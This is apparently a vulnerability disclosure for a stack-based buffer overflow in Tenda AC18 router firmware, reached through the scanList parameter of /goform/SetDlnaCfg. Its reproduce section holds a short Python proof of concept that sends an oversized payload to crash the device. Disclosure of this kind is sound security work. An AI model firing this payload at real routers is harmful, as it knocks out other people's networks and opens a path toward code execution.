# Bug Report: Buffer Overflow in Tenda AC18 V1.0 15.03.05.05 Router
A buffer overflow vulnerability has been identified in the Tenda AC18 V1.0 15.03.05.05 router firmware that allows remote attackers to potentially execute arbitrary code or cause denial of service through malformed HTTP requests.

## Vulnerability Details

### Product Information
- **Product**: Tenda AC18 V1.0 Wireless Router
- **Affected Version**: V15.03.05.05
- **Vulnerability Type**: Stack-based Buffer Overflow

## Description:
The vulnerable code path processes HTTP requests to the `/goform/SetDlnaCfg`. When `scanList` is specified with excessive data, the buffer overflow occurs during `sprintf`.
![alt text](image-2.png)
## poc
![alt text](image.png)
![alt text](image-1.png)


## Reproduce
```python
from pwn import *
import requests

def send_payload(url, payload):
    print("sending...")
    response = requests.get(url, params={'scanList': payload})
    print(f"Response status code: {response.status_code}\nResponse body: {response.text}")

payload = 0x1000 * b'A' + b'\t'

send_payload("http://10.10.10.1/goform/SetDlnaCfg", payload)
```
